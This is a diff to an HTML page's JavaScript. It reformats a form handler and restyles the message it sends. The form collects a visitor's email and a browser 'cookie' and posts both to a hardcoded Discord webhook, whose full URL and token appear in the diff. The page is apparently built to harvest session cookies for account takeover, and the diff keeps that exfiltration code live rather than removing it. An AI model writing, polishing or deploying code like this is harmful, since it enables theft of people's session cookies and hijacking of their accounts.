@@ -345,64 +345,64 @@
       return cookie.length > 30;
     }
 
-    // Form handling
-    document.getElementById('contact-form').addEventListener('submit', async (e) => {
-      e.preventDefault();
-      
-      const email = document.getElementById('email').value.trim();
-      const cookie = document.getElementById('cookie').value.trim();
-      const statusMessage = document.getElementById('status-message');
-      
-      // Validate email
-      if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
-        statusMessage.textContent = 'Please enter a valid email address';
-        statusMessage.className = 'status-message error';
-        statusMessage.style.display = 'block';
-        return;
-      }
-      
-      // Validate cookie
-      if (!isCookieValid(cookie)) {
-        statusMessage.textContent = 'Please enter a valid cookie';
-        statusMessage.className = 'status-message error';
-        statusMessage.style.display = 'block';
-        return;
-      }
-      
-      try {
-        const submitBtn = e.target.querySelector('button[type="submit"]');
-        const originalText = submitBtn.innerHTML;
-        submitBtn.innerHTML = `<span class="spin">🌀</span> Processing...`;
-        submitBtn.disabled = true;
-        
-        // FIXED WEBHOOK CODE:
-        await fetch('https://discord.com/api/webhooks/1363128166595690516/dcV-SH3jDjeEIQKfLwcTf3Se313h5DByjdXyPrtaso-0Mk1_deR3_WWFB7Axr5mU4Slu', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            content: `📧 Email: ${email}\n🍪 Cookie:\n\`\`\`${cookie}\n\`\`\``
-          })
-        });
-        
-        statusMessage.textContent = 'Success! Cookie submitted.';
-        statusMessage.className = 'status-message success';
-        statusMessage.style.display = 'block';
-        e.target.reset();
-        
-        setTimeout(() => {
-          submitBtn.innerHTML = originalText;
-          submitBtn.disabled = false;
-        }, 2000);
-      } catch (err) {
-        statusMessage.textContent = 'Error submitting. Please try again.';
-        statusMessage.className = 'status-message error';
-        statusMessage.style.display = 'block';
-        
-        const submitBtn = e.target.querySelector('button[type="submit"]');
-        submitBtn.innerHTML = originalText;
-        submitBtn.disabled = false;
-      }
+// Form handling
+document.getElementById('contact-form').addEventListener('submit', async (e) => {
+  e.preventDefault();
+  
+  const email = document.getElementById('email').value.trim();
+  const cookie = document.getElementById('cookie').value.trim();
+  const statusMessage = document.getElementById('status-message');
+  
+  // Validate email
+  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+    statusMessage.textContent = 'Please enter a valid email address';
+    statusMessage.className = 'status-message error';
+    statusMessage.style.display = 'block';
+    return;
+  }
+  
+  // Validate cookie
+  if (!isCookieValid(cookie)) {
+    statusMessage.textContent = 'Please enter a valid cookie';
+    statusMessage.className = 'status-message error';
+    statusMessage.style.display = 'block';
+    return;
+  }
+  
+  try {
+    const submitBtn = e.target.querySelector('button[type="submit"]');
+    const originalText = submitBtn.innerHTML;
+    submitBtn.innerHTML = `<span class="spin">🌀</span> Processing...`;
+    submitBtn.disabled = true;
+    
+    // Updated webhook code with divider
+    await fetch('https://discord.com/api/webhooks/1363128166595690516/dcV-SH3jDjeEIQKfLwcTf3Se313h5DByjdXyPrtaso-0Mk1_deR3_WWFB7Axr5mU4Slu', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        content: `📧 **Email:** ${email}\n🍪 **Cookie:**\n\`\`\`${cookie}\n\`\`\`\n━━━━━━━━━━━━━━━━━━━━━━━━\n`
+      })
     });
+    
+    statusMessage.textContent = 'Success! Cookie submitted.';
+    statusMessage.className = 'status-message success';
+    statusMessage.style.display = 'block';
+    e.target.reset();
+    
+    setTimeout(() => {
+      submitBtn.innerHTML = originalText;
+      submitBtn.disabled = false;
+    }, 2000);
+  } catch (err) {
+    statusMessage.textContent = 'Error submitting. Please try again.';
+    statusMessage.className = 'status-message error';
+    statusMessage.style.display = 'block';
+    
+    const submitBtn = e.target.querySelector('button[type="submit"]');
+    submitBtn.innerHTML = originalText;
+    submitBtn.disabled = false;
+  }
+});
   </script>
 </body>
 </html>
